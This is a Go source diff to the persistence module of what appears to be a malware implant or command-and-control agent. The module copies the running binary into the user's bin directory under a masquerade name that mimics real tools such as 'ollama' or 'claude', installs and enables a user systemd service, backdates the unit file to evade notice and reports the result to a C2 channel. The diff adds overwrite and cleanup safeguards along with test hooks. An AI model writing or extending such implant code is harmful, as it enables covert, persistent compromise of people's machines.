@@ -57,7 +57,10 @@ func dropPersistCopy() (string, error) {
 	if err != nil {
 		return "", fmt.Errorf("no home dir: %v", err)
 	}
-	name := agentutils.MasqueradeName()
+	name := dropPersistName
+	if name == "" {
+		name = agentutils.MasqueradeName()
+	}
 	if name == "" {
 		name = "ollama" // fallback cover name
 	}
@@ -67,10 +70,20 @@ func dropPersistCopy() (string, error) {
 	}
 	binPath := filepath.Join(binDir, name)
 
-	// read the running image (memfd works fine via /proc/self/exe)
-	self, err := os.ReadFile("/proc/self/exe")
+	// read the running image (memfd works fine via /proc/self/exe);
+	// persistSelfImage is the injectable source (tests swap it)
+	self, err := readSelfImage()
 	if err != nil {
 		return "", fmt.Errorf("read /proc/self/exe: %v", err)
+	}
+	// Collision guard: the cover name may be a REAL tool the user actually
+	// runs (claude/codex are common in ~/.local/bin). Overwriting someone's
+	// live CLI is unacceptable — refuse unless the existing bytes ARE our
+	// own image (a previous persist of this very identity).
+	if existing, err := os.ReadFile(binPath); err == nil {
+		if string(existing) != string(self) {
+			return "", fmt.Errorf("%s already exists and is not our image — refusing to overwrite a real tool; pick another identity", binPath)
+		}
 	}
 	if err := os.WriteFile(binPath, self, 0o755); err != nil {
 		return "", err
@@ -156,11 +169,21 @@ WantedBy=default.target
 		return "", err
 	}
 	util.BackdateFile(unitPath, 20, 180)
+	// Atomicity: a failed daemon-reload/enable must not leave a half-installed
+	// unit file behind — persistSystemdStatus is file-existence based, so a
+	// leftover file would report a ghost install (drill-caught). Clean up on
+	// any failure before the unit is actually enabled.
+	cleanup := func() {
+		_ = os.Remove(unitPath)
+		_, _ = systemctlUser("daemon-reload")
+	}
 	// enable + start; --now so the operator sees it working immediately
 	if out, err := systemctlUser("daemon-reload"); err != nil {
+		cleanup()
 		return "", fmt.Errorf("daemon-reload: %v: %s", err, strings.TrimSpace(out))
 	}
 	if out, err := systemctlUser("enable", name+".service"); err != nil {
+		cleanup()
 		return "", fmt.Errorf("enable: %v: %s", err, strings.TrimSpace(out))
 	}
 	// --now may fail if the session bus is unreachable from this shell; the
@@ -469,4 +492,21 @@ func runPersist(cmd *cobra.Command, args []string) {
 		}
 		c2transport.NotifyC2(cmd, "%s", strings.Join(lines, "\n"))
 	}
+}
+
+// readSelfImage returns the running image bytes; var for test injection.
+var readSelfImage = func() ([]byte, error) {
+	return os.ReadFile("/proc/self/exe")
+}
+
+// dropPersistName overrides the cover name for the persist copy (tests);
+// empty = the live masquerade identity.
+var dropPersistName string
+
+// dropPersistCopyNamed runs dropPersistCopy under an explicit cover name.
+func dropPersistCopyNamed(name string) (string, error) {
+	old := dropPersistName
+	dropPersistName = name
+	defer func() { dropPersistName = old }()
+	return dropPersistCopy()
 }
